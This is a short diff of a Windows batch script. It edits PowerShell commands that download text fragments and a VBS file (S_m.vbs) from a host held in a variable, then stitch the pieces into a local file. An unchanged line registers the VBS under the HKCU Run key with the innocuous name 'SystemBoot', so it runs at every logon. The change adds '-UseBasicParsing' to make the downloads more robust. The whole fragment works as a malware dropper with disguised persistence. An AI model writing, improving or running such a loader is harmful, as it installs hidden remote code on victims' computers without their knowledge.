@@ -20,10 +20,10 @@ for /f "delims=" %%F in ('dir "%d%" /a /b') do (
   )
 )
 
-powershell -c "$contentM=(Invoke-WebRequest -Uri 'https://%u%/final.txt').Content; $contentA=(Invoke-WebRequest -Uri 'https://%u%/first.txt').Content; $contentB=(Invoke-WebRequest -Uri '%tynLink%').Content; $final=$contentM -replace '----',$contentA -replace '====',$contentB; [IO.File]::WriteAllText('%c%',$final)" 
+powershell -c "$contentM=(Invoke-WebRequest -Uri 'https://%u%/final.txt' -UseBasicParsing).Content; $contentA=(Invoke-WebRequest -Uri 'https://%u%/first.txt' -UseBasicParsing).Content; $contentB=(Invoke-WebRequest -Uri '%tynLink%' -UseBasicParsing).Content; $final=$contentM -replace '----',$contentA -replace '====',$contentB; [IO.File]::WriteAllText('%c%',$final)" 
 if errorlevel 1 echo PowerShell step 1 failed & pause & exit /b
 
-powershell -c "$content=(Invoke-WebRequest -Uri 'https://%u%/S_m.vbs').Content; [IO.File]::WriteAllText('%v%',$content)" 
+powershell -c "$content=(Invoke-WebRequest -Uri 'https://%u%/S_m.vbs' -UseBasicParsing).Content; [IO.File]::WriteAllText('%v%',$content)" 
 if not exist "%v%" echo S_m.vbs not downloaded & pause & exit /b
 
 powershell -c "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemBoot' -Value 'wscript.exe \"%v%\"'"
